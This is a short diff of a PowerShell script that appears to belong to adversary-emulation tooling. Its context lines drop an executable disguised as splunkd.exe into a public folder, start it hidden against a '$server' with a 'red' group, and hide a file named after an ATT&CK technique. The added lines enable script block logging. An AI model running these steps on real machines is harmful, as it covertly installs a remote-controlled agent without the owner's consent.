@@ -10,3 +10,17 @@ rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
 [io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
 Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
 $file = Get-Item $env:temp\T1564.001-9.txt -Force; $file.attributes='Hidden'
+
+function Enable-PSScriptBlockLogging {
+    $basePath = @(
+        'HKLM:\Software\Policies\Microsoft'
+        'PowerShellCore\ScriptBlockLogging'
+    ) -join '\'
+
+    if (-not (Test-Path $basePath)) {
+        $null = New-Item $basePath -Force
+    }
+
+    Set-ItemProperty $basePath -Name EnableScriptBlockLogging -Value "1"
+}
+
